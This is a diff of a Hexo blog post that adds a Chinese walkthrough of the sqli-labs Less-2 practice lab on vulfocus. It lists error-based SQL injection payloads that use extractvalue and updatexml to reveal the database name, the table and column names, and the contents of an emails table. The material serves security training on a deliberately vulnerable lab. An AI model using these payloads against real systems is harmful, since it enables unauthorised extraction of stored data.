@@ -5,18 +5,30 @@
   
 
   
-  <title>vulfocus/sqli-labs  Less1  SQLI DUMB SERIES-2 | Hexo</title>
+  <title>vulfocus/sqli-labs  Less2  SQLI DUMB SERIES-2 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="article">
-<meta property="og:title" content="vulfocus&#x2F;sqli-labs  Less1  SQLI DUMB SERIES-2">
+  <meta name="description" content="输入?id&#x3D;1后页面显示登录成功，用户名Dumb密码Dumb     输入?id&#x3D;1’ 出现报错     输入?id&#x3D;1 and (extractvalue(‘anything’,’&#x2F;x&#x2F;xx’))–+报错注入执行成功     输入?id&#x3D;1 and (extractvalue(1,concat(1,(select database()))))报出用户名信息     updatexml和extra">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulfocus&#x2F;sqli-labs  Less2  SQLI DUMB SERIES-2">
 <meta property="og:url" content="http://example.com/2022/03/24/SERIES-2/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="输入?id&#x3D;1后页面显示登录成功，用户名Dumb密码Dumb     输入?id&#x3D;1’ 出现报错     输入?id&#x3D;1 and (extractvalue(‘anything’,’&#x2F;x&#x2F;xx’))–+报错注入执行成功     输入?id&#x3D;1 and (extractvalue(1,concat(1,(select database()))))报出用户名信息     updatexml和extra">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-2/1.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-2/2.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-2/3.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-2/4.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-2/5.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-2/6.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-2/7.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-2/8.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-2/9.png">
 <meta property="article:published_time" content="2022-03-24T12:56:39.000Z">
-<meta property="article:modified_time" content="2022-03-24T12:57:54.732Z">
+<meta property="article:modified_time" content="2022-03-24T16:41:36.083Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="SQL注入">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/03/24/SERIES-2/1.png">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -79,7 +91,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      vulfocus/sqli-labs  Less1  SQLI DUMB SERIES-2
+      vulfocus/sqli-labs  Less2  SQLI DUMB SERIES-2
     </h1>
   
 
@@ -87,7 +99,48 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <p>输入?id=1后页面显示登录成功，用户名Dumb密码Dumb</p>
+<img src="/2022/03/24/SERIES-2/1.png" class="">
+
+
+
+<p>输入?id=1’ 出现报错</p>
+<img src="/2022/03/24/SERIES-2/2.png" class="">
+
+
+
+<p>输入?id=1 and (extractvalue(‘anything’,’/x/xx’))–+<br>报错注入执行成功</p>
+<img src="/2022/03/24/SERIES-2/3.png" class="">
+
+
+
+<p>输入?id=1 and (extractvalue(1,concat(1,(select database()))))<br>报出用户名信息</p>
+<img src="/2022/03/24/SERIES-2/4.png" class="">
+
+
+
+<p>updatexml和extractvalue都是基于xml语法<br>输入?id=1 and (updatexml(1,concat(1,(select database())),1))<br>报出用户名信息</p>
+<img src="/2022/03/24/SERIES-2/5.png" class="">
+
+
+
+<p>输入?id=1 and (updatexml(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1))<br>爆出表名</p>
+<img src="/2022/03/24/SERIES-2/6.png" class="">
+
+
+
+<p>输入?id=1 and (updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name=’emails’)),1))<br>报出emails表中的列名</p>
+<img src="/2022/03/24/SERIES-2/7.png" class="">
+
+
+
+<p>输入?id=1 and (updatexml(1,concat(0x7e,(select group_concat(id,0x3a,email_id,0x7e) from emails )),1))<br>报出emails表内容，由于位数限制只能爆出前两个</p>
+<img src="/2022/03/24/SERIES-2/8.png" class="">
+
+
+
+<p>添上查询条件where id not in(1)不看id为1的数据<br>输入?id=1 and (updatexml(1,concat(0x3e,(select group_concat(id,0x3a,email_id,0x7e) from emails where id not in(1) )),1))<br>报出id2,3的数据</p>
+<img src="/2022/03/24/SERIES-2/9.png" class="">
       
     </div>
     <footer class="article-footer">
@@ -106,7 +159,7 @@
       <strong class="article-nav-caption">Newer</strong>
       <div class="article-nav-title">
         
-          vulfocus/sqli-labs  Less1  SQLI DUMB SERIES-3
+          vulfocus/sqli-labs  Less3  SQLI DUMB SERIES-3
         
       </div>
     </a>
@@ -165,11 +218,11 @@
       <ul>
         
           <li>
-            <a href="/2022/03/24/SERIES-3/">vulfocus/sqli-labs  Less1  SQLI DUMB SERIES-3</a>
+            <a href="/2022/03/24/SERIES-3/">vulfocus/sqli-labs  Less3  SQLI DUMB SERIES-3</a>
           </li>
         
           <li>
-            <a href="/2022/03/24/SERIES-2/">vulfocus/sqli-labs  Less1  SQLI DUMB SERIES-2</a>
+            <a href="/2022/03/24/SERIES-2/">vulfocus/sqli-labs  Less2  SQLI DUMB SERIES-2</a>
           </li>
         
           <li>
